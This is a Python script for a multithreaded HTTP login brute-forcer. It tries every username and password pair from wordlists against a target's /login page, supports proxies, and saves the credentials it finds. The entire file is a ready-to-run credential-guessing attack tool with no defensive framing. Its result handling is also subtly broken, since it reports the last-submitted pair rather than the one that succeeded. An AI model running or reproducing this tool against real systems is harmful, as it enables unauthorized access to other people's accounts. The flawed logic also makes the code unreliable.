import requests
import time
import sys
import argparse
from tqdm import tqdm
from colorama import Fore, Style, init
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from urllib.parse import urljoin
from datetime import datetime

init(autoreset=True)

print_lock = Lock()
success_lock = Lock()
result_queue = []

def parse_arguments():
    parser = argparse.ArgumentParser(
        description="HTTP brute-force tool with multi-threading",
        epilog="Usage:\n"
               "  python script.py [IP]\n"
               "  python script.py -u users.txt -p passwords.txt --threads 10 [IP]",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    parser.add_argument("ip", nargs="?", default=None,
                        help="Target IP / hostname (required)")

    parser.add_argument("-u", "--users", default="usernames.txt",
                        help="User list file (default: usernames.txt)")
    parser.add_argument("-p", "--passwords", default="passwords.txt",
                        help="Password list file (default: passwords.txt)")
    parser.add_argument("--threads", type=int, default=10,
                        help="Number of threads (default: 10, recommend 4-20)")
    parser.add_argument("--proxy", default=None,
                        help="Proxy URL (e.g., http://10.10.1.1:8080)")
    parser.add_argument("--timeout", type=int, default=10,
                        help="Request timeout in seconds (default: 10)")
    parser.add_argument("--output", default="success.txt",
                        help="File to save successful credentials (default: success.txt)")

    args = parser.parse_args()

    if not args.ip:
        parser.print_help()
        print(Fore.RED + "\nError: Target IP is required!")
        sys.exit(1)

    return args

def read_list(filename):
    try:
        with open(filename, "r", encoding="utf-8", errors="ignore") as f:
            return [line.strip() for line in f if line.strip()]
    except Exception as e:
        print(Fore.RED + f"Error reading {filename}: {str(e)}")
        sys.exit(1)

def is_valid_login(session, base_url, username, password, success_patterns, failure_patterns):
    try:
        # First request to get CSRF token or session
        resp = session.get(base_url, timeout=5)
        if resp.status_code != 200:
            return False, "Initial request failed"

        # Attempt login
        payload = {
            "username": username,
            "password": password
        }

        login_url = urljoin(base_url, "/login")
        resp = session.post(login_url, data=payload, timeout=5)

        if resp.status_code == 200:
            # Check for success patterns
            if any(pattern in resp.text.lower() for pattern in success_patterns):
                return True, "Success pattern found"

            # Check for failure patterns
            if any(pattern in resp.text.lower() for pattern in failure_patterns):
                return False, "Failure pattern found"

            # Check for redirect
            if resp.history:
                return True, "Redirect detected"

            # Check for session cookies
            if any(cookie in session.cookies.get_dict() for cookie in ["sessionid", "PHPSESSID", "auth"]):
                return True, "Session cookie found"

            return False, "No clear indication"

        return False, f"Unexpected status code: {resp.status_code}"

    except Exception as e:
        return False, f"Request failed: {str(e)}"

def worker(args):
    target_ip, user_file, pass_file, max_threads, success_patterns, failure_patterns, proxy, timeout, output_file = args
    base_url = f"http://{target_ip}"

    try:
        session = requests.Session()
        if proxy:
            session.proxies = {"http": proxy, "https": proxy}
        session.timeout = timeout

        users = read_list(user_file)
        passwords = read_list(pass_file)

        if not users or not passwords:
            print(Fore.RED + "No users or passwords to test!")
            return

        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            futures = []
            for user in users:
                for password in passwords:
                    futures.append(executor.submit(
                        is_valid_login,
                        session,
                        base_url,
                        user,
                        password,
                        success_patterns,
                        failure_patterns
                    ))

            for future in as_completed(futures):
                success, reason = future.result()
                if success:
                    with success_lock:
                        result_queue.append(f"{user}:{password}")
                        print(Fore.GREEN + f"[SUCCESS] Found: {user}:{password} ({reason})")
                    if output_file:
                        with open(output_file, "a") as f:
                            f.write(f"{user}:{password}\n")

                    # Optional: Add delay to avoid rate limiting
                    time.sleep(0.1)

    except Exception as e:
        print(Fore.RED + f"Critical error: {str(e)}")

def main():
    args = parse_arguments()
    success_patterns = ["success", "authenticated", "token", "logged in"]
    failure_patterns = ["error", "invalid", "wrong", "failed"]

    proxy = args.proxy
    timeout = args.timeout

    if args.output:
        with open(args.output, "w") as f:
            f.write("")  # Clear existing file

    worker((
        args.ip,
        args.users,
        args.passwords,
        args.threads,
        success_patterns,
        failure_patterns,
        proxy,
        timeout,
        args.output
    ))

if __name__ == "__main__":
    main()
